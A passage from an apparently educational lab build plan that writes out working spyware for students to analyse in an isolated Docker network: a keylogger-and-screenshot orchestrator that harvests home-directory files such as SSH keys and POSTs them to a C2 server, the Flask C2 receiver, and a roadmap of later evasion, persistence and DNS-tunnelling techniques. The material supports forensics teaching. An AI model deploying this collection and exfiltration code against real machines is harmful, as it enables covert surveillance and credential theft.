- [ ] **Step 5: Commit**

```bash
git add core/spyware-samples/shared/collector.py tests/test_shared_modules.py
git commit -m "feat(collector): add file harvester and screenshot wrappers"
```

---

### Task 6 — Shared HTTP exfil (`exfil_http.py`)

Plaintext JSON POST. R1 deliberately hardcodes the C2 URL in source — that is the top detection pivot. The client is a thin class so R2 can subclass it to switch transport to TLS without duplicating framing logic.

**Files:**
- Create: `core/spyware-samples/shared/exfil_http.py`
- Modify: `tests/test_shared_modules.py` — add HTTP exfil tests.

- [ ] **Step 1: Write the failing test**

Append to `tests/test_shared_modules.py`:
```python
# --- HTTP exfil ------------------------------------------------------------

def test_http_exfil_module_importable():
    import exfil_http  # noqa: F401


def test_http_exfil_posts_plaintext_json(monkeypatch):
    import exfil_http

    captured = {}

    def fake_post(url, json=None, timeout=None, **kw):
        captured["url"] = url
        captured["json"] = json
        captured["timeout"] = timeout

        class _R:
            status_code = 200

            def raise_for_status(self):
                pass

        return _R()

    monkeypatch.setattr("requests.post", fake_post)

    client = exfil_http.HttpExfilClient(host="10.13.37.1", port=8080)
    ok = client.send({
        "host": "workstation-042",
        "user": "analyst",
        "keys": ["h", "i"],
        "files": {".bash_history": "ls -la\n"},
    })

    assert ok is True
    assert captured["url"] == "http://10.13.37.1:8080/collect"
    assert captured["json"]["host"] == "workstation-042"
    assert captured["json"]["keys"] == ["h", "i"]
    assert captured["timeout"] == 10


def test_http_exfil_returns_false_on_network_error(monkeypatch):
    import exfil_http
    import requests

    def fake_post(*a, **kw):
        raise requests.ConnectionError("c2 unreachable")

    monkeypatch.setattr("requests.post", fake_post)
    client = exfil_http.HttpExfilClient(host="10.13.37.1", port=8080)
    assert client.send({"ping": 1}) is False


def test_http_exfil_uses_scenario_facts_defaults(monkeypatch):
    """Constructor without args should pull C2_IP and C2_HTTP_PORT from scenario_facts."""
    import exfil_http
    client = exfil_http.HttpExfilClient()
    from generators.data import scenario_facts as sf
    assert client.host == sf.C2_IP
    assert client.port == sf.C2_HTTP_PORT
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_shared_modules.py -v -k "http_exfil"`
Expected: `ModuleNotFoundError: No module named 'exfil_http'`.

- [ ] **Step 3: Implement `exfil_http.py`**

Create `core/spyware-samples/shared/exfil_http.py`:
```python
"""HTTP POST exfiltration for R1 (plaintext) and R2 (HTTPS, via subclass).

Framing is intentionally trivial: POST /collect with a JSON body. Students
reading `tcpdump -A port 8080` see every field in the clear — that is the R1
learning pivot.
"""
from __future__ import annotations

from typing import Optional

import requests

# scenario_facts lives in generators/, which is on sys.path when the sample runs
# inside the victim container (PYTHONPATH set in Dockerfile) and when tests run
# from the repo root (pythonpath = . in pytest.ini).
from generators.data import scenario_facts as sf


class HttpExfilClient:
    DEFAULT_TIMEOUT_SECONDS: int = 10
    PATH: str = "/collect"
    SCHEME: str = "http"

    def __init__(
        self,
        host: Optional[str] = None,
        port: Optional[int] = None,
        *,
        timeout: Optional[int] = None,
    ) -> None:
        self.host = host if host is not None else sf.C2_IP
        self.port = port if port is not None else sf.C2_HTTP_PORT
        self.timeout = timeout if timeout is not None else self.DEFAULT_TIMEOUT_SECONDS

    @property
    def url(self) -> str:
        return f"{self.SCHEME}://{self.host}:{self.port}{self.PATH}"

    def send(self, payload: dict) -> bool:
        """POST ``payload`` as JSON. Return True on 2xx, False on any error."""
        try:
            r = requests.post(self.url, json=payload, timeout=self.timeout)
            r.raise_for_status()
        except requests.RequestException:
            return False
        return True
```

- [ ] **Step 4: Run tests**

Run: `pytest tests/test_shared_modules.py -v`
Expected: 14 passed.

- [ ] **Step 5: Commit**

```bash
git add core/spyware-samples/shared/exfil_http.py tests/test_shared_modules.py
git commit -m "feat(exfil): plaintext HTTP POST client using scenario_facts defaults"
```

---

### Task 7 — R1 spyware orchestrator (`round-1/spyware.py`)

Ties keylogger + file harvest + screenshot + HTTP exfil into one script with a simple main loop. No persistence, no evasion, no packing — per spec, R1 is "genuinely naïve." Every field in the exfil payload is a plain string or list. The C2 URL is hardcoded in `exfil_http.py` (loaded from `scenario_facts`), so `strings round-1/spyware.py` reveals both the sample's collection behavior *and* the C2 endpoint indirectly.

The sample is a standalone script. Its first four lines are the mandatory lab header, checked by Task 2/3 tests.

**Files:**
- Create: `core/spyware-samples/round-1/spyware.py`

- [ ] **Step 1: Write the failing test**

The sentinel test `test_at_least_one_sample_exists_after_round_1` in `tests/test_spyware_samples.py` already fails. Run it now and confirm before writing the sample:

Run: `pytest tests/test_spyware_samples.py::test_at_least_one_sample_exists_after_round_1 -v`
Expected: FAIL (expected message about missing `core/spyware-samples/round-*/spyware.py`).

- [ ] **Step 2: Write R1 orchestrator**

Create `core/spyware-samples/round-1/spyware.py`:
```python
# GHOST-IN-THE-BOX LAB — EDUCATIONAL SAMPLE
# Round: 1 | Isolated Docker environment only
# For use in university cybersecurity courses
# MITRE ATT&CK: T1056.001, T1113, T1005, T1071.001, T1041
"""R1 naïve spyware.

Collection: keylogger (X11), ~$HOME file harvest, screenshot (scrot).
Exfil:      HTTP POST plaintext JSON to c2-server:8080 every 60s.
Evasion:    NONE. Process name, open sockets, and C2 URL are all visible.
Persistence: NONE (R1 is a one-shot foreground process).

Runs as the `analyst` user inside the victim container. See zadania.md for
the red-team walkthrough students follow.
"""
import os
import time
from pathlib import Path

# Shared modules live in /opt/spyware/shared inside the container; the Dockerfile
# sets PYTHONPATH so these imports resolve without package qualification.
import collector
import exfil_http

from generators.data import scenario_facts as sf


def _build_payload(keys: list[str], files: dict, screenshot_path: Path) -> dict:
    screenshot_bytes_len = (
        screenshot_path.stat().st_size if screenshot_path.exists() else 0
    )
    return {
        "host": sf.VICTIM_HOSTNAME,
        "user": sf.VICTIM_USERNAME,
        "ts_epoch": int(time.time()),
        "keys": keys,
        "files": files,
        "screenshot_bytes": screenshot_bytes_len,
    }


def main() -> None:
    home = Path(os.path.expanduser(f"~{sf.VICTIM_USERNAME}"))
    screenshot_dir = Path("/tmp")
    screenshot_dir.mkdir(exist_ok=True)

    keylogger = collector.Keylogger()
    keylogger.start()

    client = exfil_http.HttpExfilClient()

    try:
        while True:
            time.sleep(sf.EXFIL_INTERVAL_SECONDS)

            keys = keylogger.flush()
            files = collector.harvest_files(home, sf.STOLEN_FILES)
            shot = screenshot_dir / f"screen-{int(time.time())}.png"
            collector.take_screenshot(shot)

            payload = _build_payload(keys, files, shot)
            client.send(payload)
    finally:
        keylogger.stop()


if __name__ == "__main__":
    main()
```

- [ ] **Step 3: Run the previously-failing tests**

Run: `pytest tests/test_spyware_samples.py tests/test_mitre_mapping.py -v`
Expected: all pass (sentinel, parseability, header check, MITRE allowlist subset, ≥3 TTPs declared, R1-specific technique check).

- [ ] **Step 4: Smoke-test the import graph locally**

Run: `PYTHONPATH=core/spyware-samples/shared:. python -c "import ast; ast.parse(open('core/spyware-samples/round-1/spyware.py').read()); print('ok')"`
Expected: `ok`.

(We do not run `main()` here — that spawns a real keylogger and POST loop; those are exercised by the integration test in Task 13.)

- [ ] **Step 5: Commit**

```bash
git add core/spyware-samples/round-1/spyware.py
git commit -m "feat(round-1): naïve spyware orchestrator (keylog + harvest + HTTP exfil)"
```

---

### Task 8 — Scenario narrative: `briefing.md` and `attacker-profile.md` (Polish)

Two short Polish documents that students read before R1 starts. These are shared across all rounds — they set the story and never need to be rewritten.

**Files:**
- Create: `core/scenario/briefing.md`
- Create: `core/scenario/attacker-profile.md`

- [ ] **Step 1: Write a structural test**

Create `tests/test_scenario_narrative.py`:
```python
"""Structural checks on Polish scenario narrative files."""
import pathlib

SCENARIO = pathlib.Path(__file__).parent.parent / "core" / "scenario"


def test_briefing_exists_and_nonempty():
    p = SCENARIO / "briefing.md"
    assert p.is_file()
    assert len(p.read_text(encoding="utf-8")) > 400


def test_briefing_mentions_victim_hostname():
    text = (SCENARIO / "briefing.md").read_text(encoding="utf-8")
    assert "workstation-042" in text


def test_attacker_profile_exists_and_nonempty():
    p = SCENARIO / "attacker-profile.md"
    assert p.is_file()
    assert len(p.read_text(encoding="utf-8")) > 400


def test_attacker_profile_mentions_alias():
    text = (SCENARIO / "attacker-profile.md").read_text(encoding="utf-8")
    assert "ghost" in text.lower()


def test_narrative_is_polish_not_english():
    """Quick heuristic: Polish diacritics should appear at least a few times."""
    for fname in ("briefing.md", "attacker-profile.md"):
        text = (SCENARIO / fname).read_text(encoding="utf-8")
        polish_letters = sum(text.count(ch) for ch in "ąćęłńóśźżĄĆĘŁŃÓŚŹŻ")
        assert polish_letters >= 5, f"{fname} looks insufficiently Polish ({polish_letters} diacritics)"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_scenario_narrative.py -v`
Expected: all 5 fail with `FileNotFoundError` (the files do not exist yet).

- [ ] **Step 3: Write the Polish documents**

Create `core/scenario/briefing.md` with these sections (implementer writes full prose in Polish from these bullets; each section ~1 short paragraph):

```markdown
# Briefing — Ghost in the Box

## Kontekst
- Jesteś członkiem zespołu reagowania na incydenty w fikcyjnej firmie.
- Użytkownik `analyst` zgłasza dziwne spowolnienie stacji roboczej `workstation-042`.
- Dział bezpieczeństwa podejrzewa infekcję spyware — masz trzy rundy, by potwierdzić i unieszkodliwić zagrożenie.

## Cel laboratorium
- Przejście trzech rund o narastającym poziomie OPSEC atakującego.
- W każdej rundzie: faza red team (analiza próbki) oraz faza blue team (wykrycie, reakcja, utwardzenie).
- Wszystko dzieje się w izolowanej sieci Docker — brak połączeń do zewnętrznego internetu.

## Zasady
- Nie modyfikuj kodu próbki spyware — to materiał edukacyjny, nie cel.
- Każda runda kończy się raportem incydentu według modelu NIST SP 800-61r2 z załącznikiem MITRE ATT&CK.
- Instruktor zachowuje ground truth — porównanie obserwacji studenta z ground truth decyduje o ocenie.

## Środowisko
- Kontener `victim` — Ubuntu 24, zainfekowany.
- Kontener `c2-server` — odbiera dane wykradzione przez spyware.
- Kontener `analyst-ws` — twoje narzędzia kryminalistyczne: `strace`, `lsof`, `tcpdump`, `wireshark`/`tshark`, Volatility 3, auditd, YARA, Sigma, Suricata, Jupyter Lab.
- W Rundzie 3 dochodzi kontener `dns-server` obsługujący autorytatywnie domenę wykorzystywaną do tunelowania.
```

Create `core/scenario/attacker-profile.md` with these sections:

```markdown
# Profil atakującego — „ghost"

## Tożsamość operacyjna
- Alias: **ghost** (brak innej atrybucji; wszystkie ślady prowadzą do tej jednej osoby/zespołu).
- Motywacja: kradzież poufnych dokumentów i dostępów SSH z pojedynczych stacji analityków.

## Modus operandi
- Stosuje własne narzędzia w Pythonie — unika publicznych framework'ów C2.
- Dostęp początkowy (poza zakresem laboratorium) zostaje oznaczony jako „poza scope" — interesuje nas tylko post-exploitation.
- Utrwala się tylko tam, gdzie jest to konieczne; w Rundzie 1 nie utrwala się w ogóle.

## Ewolucja OPSEC między rundami
- **Runda 1 — Naïve.** Brak prób ukrycia. Proces widoczny, nazwa oczywista, ruch sieciowy jawny (HTTP), brak utrwalenia.
- **Runda 2 — Masquerading.** Proces podszywa się pod wątek jądra (`[kworker/u4:2]` poprzez `prctl(PR_SET_NAME)` i nadpisanie `argv[0]`). Eksfiltracja przez HTTPS z przypiętym samopodpisanym certyfikatem. Utrwalenie przez `crontab @reboot`. Binarka ELF jest stripowana.
- **Runda 3 — Advanced.** Proces ukryty przed `/proc` przez `libhide.so` ładowaną za pomocą `LD_PRELOAD`. Eksfiltracja przez tunel DNS (base32 w subdomenach). Kasowanie wpisów z `/var/log/syslog`. Antyforenzyka: `touch -t` zmienia mtime/atime (ale nie ctime — to celowa pomyłka). Utrwalenie w `~/.bashrc`.

## Słabości (wiedza instruktora — nie ujawniaj studentom)
- Instruktor zna listę celowych błędów OPSEC atakującego dla każdej rundy; znajdują się w `module-techlab/rounds/round-N-.../instructor-notes.md`.
- Zadaniem studenta jest samodzielne ich odkrycie w kolejnych rundach.
```

- [ ] **Step 4: Run tests**

Run: `pytest tests/test_scenario_narrative.py -v`
Expected: 5 passed.

- [ ] **Step 5: Commit**

```bash
git add core/scenario/ tests/test_scenario_narrative.py
git commit -m "docs(scenario): briefing and attacker profile (Polish)"
```

---

### Task 9 — `docker-compose.yml` base + isolated network

The compose file declares the `ghost-net` bridge network with a fixed subnet so `c2-server` can claim `10.13.37.1`, and defines three services under the `full` profile. `internal: true` prevents external egress. The `dns-server` service is not defined in this plan — it arrives with the R3 plan under the `round3` profile.

**Files:**
- Create: `module-techlab/.env.example`
- Create: `module-techlab/docker-compose.yml`

- [ ] **Step 1: Write a structural test**

Create `tests/test_compose_structure.py`:
```python
"""Structural checks on docker-compose.yml — no Docker engine required."""
import ipaddress
import pathlib

import pytest

yaml = pytest.importorskip("yaml")

COMPOSE = pathlib.Path(__file__).parent.parent / "module-techlab" / "docker-compose.yml"


@pytest.fixture(scope="module")
def compose():
    return yaml.safe_load(COMPOSE.read_text(encoding="utf-8"))


def test_ghost_net_defined_with_internal_flag(compose):
    net = compose["networks"]["ghost-net"]
    assert net["driver"] == "bridge"
    assert net["internal"] is True, "lab must not reach the host/internet"
    ipam = net["ipam"]["config"][0]
    assert ipam["subnet"] == "10.13.37.0/24"
    assert ipam["gateway"] == "10.13.37.254"


def test_services_present_under_full_profile(compose):
    services = compose["services"]
    for name in ("victim", "c2-server", "analyst-ws"):
        assert name in services, f"{name} missing from compose"
        assert "full" in services[name].get("profiles", []), (
            f"{name} not in 'full' profile"
        )


def test_c2_server_pins_static_ip(compose):
    c2 = compose["services"]["c2-server"]
    net = c2["networks"]["ghost-net"]
    assert ipaddress.IPv4Address(net["ipv4_address"]) == ipaddress.IPv4Address("10.13.37.1")


def test_victim_receives_round_build_arg(compose):
    victim = compose["services"]["victim"]
    build = victim["build"]
    args = build.get("args", {})
    # ROUND may appear as a placeholder ("${ROUND:-1}") — accept either literal or default form.
    assert "ROUND" in args, "victim.build.args must include ROUND"


def test_c2_server_port_is_8080_internal_only(compose):
    c2 = compose["services"]["c2-server"]
    # Because the net is internal, there are no host-mapped ports.
    assert "ports" not in c2, "c2-server must not expose host ports on internal network"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_compose_structure.py -v`
Expected: `FileNotFoundError` on all tests (compose file absent).

- [ ] **Step 3: Write compose file and .env**

Create `module-techlab/.env.example`:
```
# Copy to .env and adjust. ROUND selects which spyware variant is installed.
ROUND=1
```

Create `module-techlab/docker-compose.yml`:
```yaml
name: ghost-in-the-box

networks:
  ghost-net:
    driver: bridge
    internal: true
    ipam:
      config:
        - subnet: 10.13.37.0/24
          gateway: 10.13.37.254

services:

  c2-server:
    profiles: ["full"]
    build:
      context: ./c2-server
    container_name: ghost-c2
    networks:
      ghost-net:
        ipv4_address: 10.13.37.1
    volumes:
      - ./c2-server/data:/data
    restart: unless-stopped

  victim:
    profiles: ["full"]
    build:
      context: ..
      dockerfile: module-techlab/victim/Dockerfile
      args:
        ROUND: "${ROUND:-1}"
    container_name: ghost-victim
    depends_on:
      - c2-server
    networks:
      - ghost-net
    # No exposed ports — victim is the target, not a service.
    restart: "no"

  analyst-ws:
    profiles: ["full"]
    build:
      context: ./analyst-ws
    container_name: ghost-analyst
    networks:
      - ghost-net
    volumes:
      - ../module-casefile:/casefile:ro
    cap_add:
      # Forensics tools (auditd, tcpdump in promiscuous mode) require extra caps.
      - NET_ADMIN
      - NET_RAW
      - SYS_PTRACE
      - SYS_ADMIN
    stdin_open: true
    tty: true
    restart: "no"
```

- [ ] **Step 4: Run tests**

Run: `pip install pyyaml && pytest tests/test_compose_structure.py -v`
Expected: 5 passed.

- [ ] **Step 5: Commit**

```bash
git add module-techlab/docker-compose.yml module-techlab/.env.example tests/test_compose_structure.py
git commit -m "feat(techlab): base compose with isolated ghost-net and three services"
```

---

### Task 10 — `victim/` container

Ubuntu 24 + Python 3.12 + Xvfb + scrot + xdotool (for the integration test to inject keystrokes). Build arg `ROUND` selects which round's sample is copied in. `entrypoint.sh` starts Xvfb on `:99`, exports `DISPLAY=:99`, then `exec`s the sample.

**Files:**
- Create: `module-techlab/victim/Dockerfile`
- Create: `module-techlab/victim/entrypoint.sh`

- [ ] **Step 1: Write a structural test**

Create `tests/test_victim_dockerfile.py`:
```python
"""Structural checks on the victim Dockerfile."""
import pathlib

DOCKERFILE = pathlib.Path(__file__).parent.parent / "module-techlab" / "victim" / "Dockerfile"
ENTRYPOINT = pathlib.Path(__file__).parent.parent / "module-techlab" / "victim" / "entrypoint.sh"


def test_dockerfile_base_is_ubuntu_24():
    content = DOCKERFILE.read_text(encoding="utf-8")
    assert "FROM ubuntu:24.04" in content


def test_dockerfile_declares_round_arg():
    content = DOCKERFILE.read_text(encoding="utf-8")
    assert "ARG ROUND" in content


def test_dockerfile_installs_xvfb_scrot_xdotool():
    content = DOCKERFILE.read_text(encoding="utf-8")
    for pkg in ("xvfb", "scrot", "xdotool", "python3", "python3-pip"):
        assert pkg in content, f"{pkg} not installed in victim image"


def test_dockerfile_sets_pythonpath_for_shared_modules():
    content = DOCKERFILE.read_text(encoding="utf-8")
    assert "PYTHONPATH" in content
    assert "/opt/spyware/shared" in content


def test_dockerfile_copies_round_sample():
    content = DOCKERFILE.read_text(encoding="utf-8")
    assert "core/spyware-samples/round-${ROUND}/spyware.py" in content
    assert "core/spyware-samples/shared/" in content


def test_entrypoint_starts_xvfb_and_execs_sample():
    content = ENTRYPOINT.read_text(encoding="utf-8")
    assert "Xvfb" in content
    assert "DISPLAY" in content
    assert "exec python3 /opt/spyware/spyware.py" in content
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_victim_dockerfile.py -v`
Expected: `FileNotFoundError` on all tests.

- [ ] **Step 3: Write Dockerfile and entrypoint**

Create `module-techlab/victim/Dockerfile`:
```dockerfile
# syntax=docker/dockerfile:1.7
FROM ubuntu:24.04

ARG ROUND=1
ENV DEBIAN_FRONTEND=noninteractive \
    PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1 \
    DISPLAY=:99

RUN apt-get update && apt-get install -y --no-install-recommends \
        python3 python3-pip python3-venv \
        xvfb scrot xdotool x11-utils \
        ca-certificates cron procps tini \
    && rm -rf /var/lib/apt/lists/*

# Unprivileged victim user + pre-seeded harvest targets (contents are
# deterministic and referenced by integration-test assertions in Task 13).
RUN useradd --create-home --shell /bin/bash analyst \
 && mkdir -p /home/analyst/Documents /home/analyst/.ssh \
 && printf 'ls -la\ncat Documents/report-draft.txt\nssh analyst@prod-01\n' > /home/analyst/.bash_history \
 && printf '%s\n' '-----BEGIN OPENSSH PRIVATE KEY-----' 'MOCK-RSA-PRIVATE-KEY-DO-NOT-USE-FOR-ANYTHING' '-----END OPENSSH PRIVATE KEY-----' > /home/analyst/.ssh/id_rsa \
 && chmod 600 /home/analyst/.ssh/id_rsa \
 && printf 'Q4 report draft — internal only. Revenue figures redacted.\n' > /home/analyst/Documents/report-draft.txt \
 && chown -R analyst:analyst /home/analyst

# Python deps for the sample.
COPY core/spyware-samples/requirements.txt /tmp/spyware-reqs.txt
RUN pip3 install --break-system-packages --no-cache-dir -r /tmp/spyware-reqs.txt

# Shared modules + round-specific sample + scenario_facts (importable by the sample).
RUN mkdir -p /opt/spyware/shared
COPY core/spyware-samples/shared/ /opt/spyware/shared/
COPY core/spyware-samples/round-${ROUND}/spyware.py /opt/spyware/spyware.py
COPY generators /opt/spyware/generators

# One PYTHONPATH, set after all COPY steps to keep the intent obvious.
ENV PYTHONPATH=/opt/spyware:/opt/spyware/shared

COPY module-techlab/victim/entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

USER analyst
WORKDIR /home/analyst

ENTRYPOINT ["/usr/bin/tini", "--", "/entrypoint.sh"]
```

Create `module-techlab/victim/entrypoint.sh`:
```bash
#!/usr/bin/env bash
set -euo pipefail

# Start Xvfb in the background on display :99.
Xvfb :99 -screen 0 1024x768x24 &

# Wait until Xvfb is accepting connections (max ~2s).
for _ in $(seq 1 20); do
  if xdpyinfo -display :99 >/dev/null 2>&1; then
    break
  fi
  sleep 0.1
done

export DISPLAY=:99

# Hand off to the spyware sample.
exec python3 /opt/spyware/spyware.py
```

- [ ] **Step 4: Run tests**

Run: `pytest tests/test_victim_dockerfile.py -v`
Expected: 6 passed.

- [ ] **Step 5: Commit**

```bash
git add module-techlab/victim/ tests/test_victim_dockerfile.py
git commit -m "feat(victim): Ubuntu 24 image with Xvfb and round-selected spyware"
```

---

### Task 11 — `c2-server/` container

Tiny Flask app that accepts POSTs on `/collect` and appends each payload as a JSON line to `/data/received.jsonl`. TLS termination and certificate handling belong to the R2 plan — this app listens on plain HTTP only.

**Files:**
- Create: `module-techlab/c2-server/Dockerfile`
- Create: `module-techlab/c2-server/requirements.txt`
- Create: `module-techlab/c2-server/app.py`

- [ ] **Step 1: Write a structural test**

Create `tests/test_c2_server.py`:
```python
"""Unit tests for the c2-server Flask app (no Docker required)."""
import json
import pathlib
import sys

import pytest

C2_DIR = pathlib.Path(__file__).parent.parent / "module-techlab" / "c2-server"
sys.path.insert(0, str(C2_DIR))


@pytest.fixture
def client(tmp_path, monkeypatch):
    monkeypatch.setenv("C2_DATA_DIR", str(tmp_path))
    import importlib
    import app as c2_app
    importlib.reload(c2_app)
    c2_app.app.config["TESTING"] = True
    with c2_app.app.test_client() as c:
        yield c, tmp_path


def test_collect_persists_payload(client):
    c, data_dir = client
    resp = c.post("/collect", json={"host": "h", "user": "u", "keys": ["a"]})
    assert resp.status_code == 200
    lines = (data_dir / "received.jsonl").read_text().strip().splitlines()
    assert len(lines) == 1
    record = json.loads(lines[0])
    assert record["host"] == "h"
    assert record["user"] == "u"
    assert record["keys"] == ["a"]
    assert "received_at" in record


def test_collect_rejects_non_json(client):
    c, _ = client
    resp = c.post("/collect", data="not json", content_type="text/plain")
    assert resp.status_code == 400


def test_healthcheck(client):
    c, _ = client
    resp = c.get("/healthz")
    assert resp.status_code == 200
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_c2_server.py -v`
Expected: `ModuleNotFoundError: No module named 'app'`.

- [ ] **Step 3: Write app, requirements, Dockerfile**

Create `module-techlab/c2-server/requirements.txt`:
```
flask==3.0.3
```

Create `module-techlab/c2-server/app.py`:
```python
"""R1/R2 C2 receiver — Flask over HTTP (R1) / HTTPS (R2).

Persists every POSTed payload as a line of JSON under $C2_DATA_DIR/received.jsonl
for students to inspect with `cat`, `jq`, etc.
"""
from __future__ import annotations

import json
import os
import pathlib
import time

from flask import Flask, jsonify, request

DATA_DIR = pathlib.Path(os.environ.get("C2_DATA_DIR", "/data"))
DATA_DIR.mkdir(parents=True, exist_ok=True)
LOG_PATH = DATA_DIR / "received.jsonl"

app = Flask(__name__)


@app.post("/collect")
def collect():
    payload = request.get_json(silent=True)
    if payload is None:
        return jsonify({"error": "invalid json"}), 400

    record = {"received_at": time.time(), **payload}
    with LOG_PATH.open("a", encoding="utf-8") as f:
        f.write(json.dumps(record, default=str) + "\n")
    return jsonify({"status": "ok"}), 200


@app.get("/healthz")
def healthz():
    return jsonify({"status": "ok"}), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("C2_HTTP_PORT", "8080")))
```

Create `module-techlab/c2-server/Dockerfile`:
```dockerfile
# syntax=docker/dockerfile:1.7
FROM python:3.12-slim

ENV PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1 \
    C2_DATA_DIR=/data \
    C2_HTTP_PORT=8080

WORKDIR /srv

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY app.py .

RUN mkdir -p /data
VOLUME ["/data"]

EXPOSE 8080
CMD ["python", "app.py"]
```

- [ ] **Step 4: Run tests**

Run: `pip install flask==3.0.3 && pytest tests/test_c2_server.py -v`
Expected: 3 passed.

- [ ] **Step 5: Commit**

```bash
git add module-techlab/c2-server/ tests/test_c2_server.py
git commit -m "feat(c2): Flask HTTP receiver persisting payloads as jsonl"
```

---

### Task 12 — `analyst-ws/` container (forensics toolset)

Ubuntu 24 image pre-loaded with the full forensics toolchain (Volatility 3, avml, yara, sigma-cli, suricata, dnscat2, Jupyter Lab, pandas/numpy/scipy/matplotlib). Some of these are heavy; they arrive in a single image so later plans don't rebuild. For R1 we only exercise `strace`, `lsof`, `ss`, `tcpdump`, `tshark`, `yara` — the rest are load-bearing for R2/R3.

**Files:**
- Create: `module-techlab/analyst-ws/Dockerfile`
- Create: `module-techlab/analyst-ws/requirements.txt`

- [ ] **Step 1: Write a structural test**

Create `tests/test_analyst_ws_dockerfile.py`:
```python
import pathlib

DOCKERFILE = pathlib.Path(__file__).parent.parent / "module-techlab" / "analyst-ws" / "Dockerfile"
REQS = pathlib.Path(__file__).parent.parent / "module-techlab" / "analyst-ws" / "requirements.txt"

REQUIRED_APT = {
    "strace", "ltrace", "lsof", "tcpdump", "tshark",
    "auditd", "yara", "suricata", "iproute2", "procps",
    "binutils", "file", "xxd",
}

REQUIRED_PY = {
    "volatility3", "yara-python", "pandas", "numpy", "scipy", "matplotlib",
    "jupyterlab", "sigma-cli",
}


def test_dockerfile_base_is_ubuntu_24():
    assert "FROM ubuntu:24.04" in DOCKERFILE.read_text()


def test_dockerfile_installs_required_forensics_apt_packages():
    content = DOCKERFILE.read_text()
    missing = [p for p in REQUIRED_APT if p not in content]
    assert not missing, f"apt packages missing: {missing}"


def test_requirements_contains_required_python_packages():
    content = REQS.read_text()
    missing = [p for p in REQUIRED_PY if p not in content]
    assert not missing, f"pip packages missing: {missing}"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_analyst_ws_dockerfile.py -v`
Expected: `FileNotFoundError`.

- [ ] **Step 3: Write Dockerfile and requirements**

Create `module-techlab/analyst-ws/requirements.txt`:
```
volatility3==2.7.0
yara-python==4.5.1
sigma-cli==1.0.4
pandas==2.2.2
numpy==1.26.4
scipy==1.13.1
matplotlib==3.9.0
jupyterlab==4.2.4
dnspython==2.6.1
scapy==2.5.0
```

Create `module-techlab/analyst-ws/Dockerfile`:
```dockerfile
# syntax=docker/dockerfile:1.7
FROM ubuntu:24.04

ENV DEBIAN_FRONTEND=noninteractive \
    PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1

# System forensics toolchain. Grouped logically; one RUN so the apt cache is not
# layered but the build is explicit.
RUN apt-get update && apt-get install -y --no-install-recommends \
        # Process / syscall / net tools
        strace ltrace lsof tcpdump tshark iproute2 net-tools procps \
        # Audit
        auditd audispd-plugins \
        # Binary inspection
        binutils file xxd unzip \
        # Detection engines
        yara suricata \
        # Python runtime + build tools for Volatility + yara-python
        python3 python3-pip python3-venv python3-dev \
        build-essential libssl-dev libffi-dev \
        # Misc
        ca-certificates curl jq vim-tiny less tini \
        # avml downloads via curl below (official release binary)
    && rm -rf /var/lib/apt/lists/*

# avml — Microsoft LiME-compatible memory acquisition tool. Pin to 0.13.0.
RUN curl -fsSL -o /usr/local/bin/avml \
    https://github.com/microsoft/avml/releases/download/v0.13.0/avml \
 && chmod +x /usr/local/bin/avml

# dnscat2 client as decoder reference (binary-only install via pip mirror not reliable;
# clone the upstream Ruby client source as a read-only reference under /opt/dnscat2).
RUN apt-get update && apt-get install -y --no-install-recommends git ruby \
 && git clone --depth=1 https://github.com/iagox86/dnscat2 /opt/dnscat2 \
 && apt-get purge -y git && apt-get autoremove -y \
 && rm -rf /var/lib/apt/lists/*

# Python tools.
COPY requirements.txt /tmp/reqs.txt
RUN pip3 install --break-system-packages --no-cache-dir -r /tmp/reqs.txt

# Volatility 3 Ubuntu 24 symbol pack. Pinned hash lives in /opt/vol-symbols/README.
# NOTE: the actual symbol pack is ~150 MB and is fetched at image build time from
# the lab's offline mirror (URL kept out of the public Dockerfile). If the mirror
# is unreachable at build time, the build fails — the pack is non-negotiable for R2/R3.
RUN mkdir -p /opt/vol-symbols \
 && echo "Symbol pack — populate from offline mirror. See docs/ops/vol-symbols.md." > /opt/vol-symbols/README
ENV VOLATILITY_PLUGIN_PATH=/opt/vol-symbols

WORKDIR /workspace
VOLUME ["/workspace"]

# Expose Jupyter Lab on 8888 for student sessions.
EXPOSE 8888

ENTRYPOINT ["/usr/bin/tini", "--"]
CMD ["bash"]
```

Note: the dnscat2 and symbol-pack sections reach outside the isolated network *at build time*; `internal: true` applies only at runtime on `ghost-net`. **If the lab must run in a fully air-gapped environment**, replace the `curl` and `git clone` calls with `COPY` of pre-downloaded files (avml binary + dnscat2 tarball) committed to a companion `offline-assets/` directory, or serve them from an internal HTTP mirror. Document in `docs/ops/vol-symbols.md` where the offline mirror lives. For this plan we do not author that doc — it's an operations concern outside R1 scope.

- [ ] **Step 4: Run tests**

Run: `pytest tests/test_analyst_ws_dockerfile.py -v`
Expected: 3 passed.

- [ ] **Step 5: Commit**

```bash
git add module-techlab/analyst-ws/ tests/test_analyst_ws_dockerfile.py
git commit -m "feat(analyst-ws): forensics toolchain image (Vol3, YARA, Sigma, Suricata, Jupyter)"
```

---

### Task 13 — R1 Docker integration test

End-to-end: bring up `docker compose --profile full up -d` with `ROUND=1`, wait for the C2 server to receive at least one POST within 120 seconds, assert the payload shape. This test is marked `docker`; it skips cleanly when `docker` or `docker compose` is not available.

**Files:**
- Create: `tests/test_techlab_integration.py`

- [ ] **Step 1: Write the test**

Create `tests/test_techlab_integration.py`:
```python
"""Docker-gated integration tests. Skipped when Docker is unavailable."""
from __future__ import annotations

import json
import pathlib
import shutil
import subprocess
import time

import pytest

REPO_ROOT = pathlib.Path(__file__).parent.parent
COMPOSE_DIR = REPO_ROOT / "module-techlab"

pytestmark = pytest.mark.docker


def _docker_available() -> bool:
    if shutil.which("docker") is None:
        return False
    try:
        r = subprocess.run(["docker", "compose", "version"],
                           capture_output=True, timeout=10)
    except Exception:
        return False
    return r.returncode == 0


